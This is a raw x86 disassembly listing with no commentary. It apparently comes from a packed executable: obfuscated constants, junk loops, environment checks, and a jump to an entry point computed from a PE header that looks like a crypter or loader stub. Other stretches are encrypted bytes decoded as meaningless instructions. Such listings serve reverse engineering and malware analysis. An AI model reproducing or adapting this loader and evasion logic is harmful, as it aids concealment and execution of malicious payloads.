  40d796:	test   DWORD PTR [eax-0x29b2302a],edi
  40d79c:	sar    edx,cl
  40d79e:	lods   al,BYTE PTR cs:[esi]
  40d7a0:	aas    
  40d7a1:	shl    bl,cl
  40d7a3:	sbb    eax,0x777da7b3
  40d7a8:	stc    
  40d7a9:	mov    WORD PTR [edi-0x1b],gs
  40d7ac:	jne    0x40d76b
  40d7ae:	adc    ch,dl
  40d7b0:	inc    edx
  40d7b1:	cmp    dl,BYTE PTR [eax]
  40d7b3:	call   edx
  40d7b5:	fstp   DWORD PTR [eax]
  40d7b7:	retf   0x771
  40d7ba:	mov    eax,0x44421443
  40d7bf:	outs   dx,BYTE PTR ds:[esi]
  40d7c0:	lds    edi,FWORD PTR [edx]
  40d7c2:	mov    ds:0xbbeaeb12,eax
  40d7c7:	push   ss
  40d7c8:	xor    al,0x85
  40d7ca:	or     DWORD PTR [edx-0xa681dbf],edx
  40d7d0:	pop    edi
  40d7d1:	inc    esi
  40d7d2:	lahf   
  40d7d3:	mov    edi,0x7b21dda5
  40d7d8:	cmp    al,0xef
  40d7da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7db:	sahf   
  40d7dc:	iret   
  40d7dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7de:	xchg   esp,eax
  40d7df:	cmc    
  40d7e0:	xchg   ebp,eax
  40d7e1:	daa    
  40d7e2:	jb     0x40d806
  40d7e4:	cmp    BYTE PTR [edi+0x2d],0x79
  40d7e8:	xor    al,0xbd
  40d7ea:	mov    ebx,esp
  40d7ec:	lock add dh,ah
  40d7ef:	jns    0x40d85c
  40d7f1:	lock push ss
  40d7f3:	mov    cl,0xb4
  40d7f5:	stc    
  40d7f6:	pop    esi
  40d7f7:	out    dx,al
  40d7f8:	add    al,bl
  40d7fa:	jle    0x40d85a
  40d7fc:	adc    eax,0x616ec6d6
  40d801:	jl     0x40d855
  40d803:	arpl   WORD PTR [eax+0x70],ax
  40d806:	dec    ebp
  40d807:	in     eax,0x93
  40d809:	dec    esi
  40d80a:	mov    cl,0x86
  40d80c:	add    DWORD PTR [eax],esi
  40d80e:	pop    esi
  40d80f:	jle    0x40d88e
  40d811:	test   DWORD PTR [esi+0x96e0aa],esi
  40d817:	out    0x2e,eax
  40d819:	dec    ecx
  40d81a:	dec    eax
  40d81b:	mul    BYTE PTR [ebp+0x1301d308]
  40d821:	pop    ss
  40d822:	or     al,0x45
  40d824:	sub    edi,DWORD PTR [ecx+0x708dfd95]
  40d82a:	xchg   edi,eax
  40d82b:	and    ebp,edi
  40d82d:	out    dx,eax
  40d82e:	into   
  40d82f:	call   0xaa2b:0xb0b634fb
  40d836:	enter  0x2832,0x30
  40d83a:	cdq    
  40d83b:	popa   
  40d83c:	mov    DWORD PTR [ebx+0x76],0xe4758593
  40d843:	mov    ds:0x24bb174f,al
  40d848:	mov    ah,0xbc
  40d84a:	cwde   
  40d84b:	pop    esp
  40d84c:	fadd   QWORD PTR [ebp-0x1d0720d4]
  40d852:	xchg   ecx,esi
  40d854:	(bad)  
  40d855:	rcl    DWORD PTR [edi],1
  40d857:	mov    ds:0xb2ab530e,al
  40d85c:	and    esp,DWORD PTR [edx]
  40d85e:	xor    al,0x33
  40d860:	loop   0x40d877
  40d862:	ds iret 
  40d864:	dec    eax
  40d865:	js     0x40d87d
  40d867:	in     al,dx
  40d868:	jno    0x40d844
  40d86a:	sub    BYTE PTR [edi+esi*8-0x5a20343a],0x62
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fd69,0x42e19c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fdf6,0x42fd71
  40d8af:	call   DWORD PTR ds:0x42e517
  40d8b5:	and    DWORD PTR ds:0x42fd7d,0x42fe02
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e1b4,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e1a4,0x42fd69
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e58f
  40d8ee:	sbb    DWORD PTR ds:0x42e77b,0x42fdf2
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fd75,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e4d7
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd85,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fdf6,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e1a4,0x42e777
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fdee,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fd6d,0x42e198
  40d977:	call   DWORD PTR ds:0x42e51f
  40d97d:	mov    DWORD PTR ds:0x42e19c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e40f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd81,0x42e1b4
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fd6d,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e37b
  40d9be:	mov    DWORD PTR ds:0x42fe0a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e198,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fd75,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fd75
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fd75,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fd75,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e20d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e5cf
  40da20:	cmp    DWORD PTR ds:0x42fd75,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fd75
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fd75,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fd75,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e783,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e773,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fd51,0x42e19c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd85,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd85,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd85,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e5d3
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd85
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd85,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e787,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e787,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e787,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e4e3
  40dae4:	cmp    DWORD PTR ds:0x42e787,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e787
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e787,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e787
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e787,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e77f,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e77f,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e77f,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e5d7
  40db41:	cmp    DWORD PTR ds:0x42e77f,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e77f
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e77f,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e77f
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e77f,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fdf6,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fdf6,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fdf6,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e5db
  40db97:	cmp    DWORD PTR ds:0x42fdf6,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e787,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e793,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fdfe,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fd65,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fd65
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fd65,edi
  40dc13:	cmp    DWORD PTR ds:0x42fd65,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fd65,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e4e7
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e1a8,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd81,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd89,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e777,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e777,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e777,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e4eb
  40dcaa:	cmp    DWORD PTR ds:0x42e777,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e777
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e777,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e777
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e777,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe02,0x42e1ac
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe02,0x42e1a4
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fd51,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e198,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fdf2,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fdf2,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fdf2,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e4ef
  40dd4f:	cmp    DWORD PTR ds:0x42fdf2,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd8d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e1b0,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd89,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe06,0x42fd7d
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e773,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e77f,0x42fe0a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e76b
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fd65,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fd65
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fd65,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fd65,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd89
  40de0d:	push   0x42e2ed
  40de12:	call   DWORD PTR ds:0x42e4f3
  40de18:	cmp    DWORD PTR ds:0x42fd65,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fda1
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fd7d,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fd75,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fd75,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fd75,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e5df
  40de65:	mov    edx,DWORD PTR ds:0x42fd75
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fd75,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fd69,0x42fd55
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fd69
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x675e2fbc]
  40e122:	pop    esp
  40e123:	jge    0x40e18d
  40e125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e126:	jo     0x40e198
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e174
  40e12d:	call   FWORD PTR [edi-0x6d]
  40e130:	jmp    0x40e0e7
  40e132:	xor    DWORD PTR [edx-0x397c9a12],ebp
  40e138:	loop   0x40e0d8
  40e13a:	cmp    DWORD PTR [ebx-0x36],eax
  40e13d:	jb     0x40e186
  40e13f:	sub    ebx,esi
  40e141:	xchg   ebp,eax
  40e142:	lods   eax,DWORD PTR ds:[esi]
  40e143:	mov    cs,eax
  40e145:	mov    cl,0x59
  40e147:	jge    0x40e110
  40e149:	stos   DWORD PTR es:[edi],eax
  40e14a:	int    0x9c
  40e14c:	pop    es
  40e14d:	clc    
  40e14e:	ret    
  40e14f:	mov    BYTE PTR [ebp+0x59],cl
  40e152:	sbb    DWORD PTR [edx],esi
  40e154:	repnz aad 0x8f
  40e157:	loopne 0x40e11a
  40e159:	in     al,dx
  40e15a:	in     al,0x36
  40e15c:	xlat   BYTE PTR ds:[ebx]
  40e15d:	mov    edi,DWORD PTR [edi+0x0]
  40e160:	iret   
  40e161:	ss cwde 
  40e163:	or     cl,BYTE PTR [ebx+edx*8]
  40e166:	and    al,BYTE PTR [edi]
  40e168:	xor    BYTE PTR [ebx-0x64fd6c32],cl
  40e16e:	mov    edx,0x87cf72e6
  40e173:	fldl2e 
  40e175:	daa    
  40e176:	ja     0x40e1c9
  40e178:	sub    DWORD PTR [eax+eax*1+0x7fdae77],0x62
  40e180:	imul   ebp,DWORD PTR [eax+0x74a5fa4d],0x248899c1
  40e18a:	sub    edx,ebx
  40e18c:	fcom   QWORD PTR [ecx+ebx*2]
  40e18f:	dec    ebx
  40e190:	mov    dh,0xce
  40e192:	lds    edi,FWORD PTR [ebx]
  40e194:	test   al,0x79
  40e196:	sbb    edx,eax
  40e198:	dec    esi
  40e199:	fst    QWORD PTR [ebx+0x6b947fa3]
  40e19f:	hlt    
  40e1a0:	xor    eax,0x50d2e89c
  40e1a5:	int    0x38
  40e1a7:	and    BYTE PTR ds:0xb219e22d,ch
  40e1ad:	add    al,BYTE PTR [ebp+0x6153f9e9]
  40e1b3:	lock in eax,dx
  40e1b5:	dec    ebp
  40e1b6:	sub    al,0xa6
  40e1b8:	call   0x909d:0x6c30e9e6
  40e1bf:	and    bh,dl
  40e1c1:	xor    DWORD PTR [esp+ebp*4+0x7a],edi
  40e1c5:	out    0x38,al
  40e1c7:	mov    esp,0xb6f733a7
  40e1cc:	mov    dh,0xe7
  40e1ce:	xchg   esp,eax
  40e1cf:	or     edi,DWORD PTR ds:0x54ccb1e8
  40e1d5:	addr16 mov ebx,0x32811648
  40e1db:	cs xchg edx,eax
  40e1dd:	shl    eax,cl
  40e1df:	pop    ds
  40e1e0:	popa   
  40e1e1:	push   ecx
  40e1e2:	push   ds
  40e1e3:	out    dx,eax
  40e1e4:	dec    ebp
  40e1e5:	call   0x9d13e18
  40e1ea:	and    BYTE PTR [ecx-0x73dc9454],cl
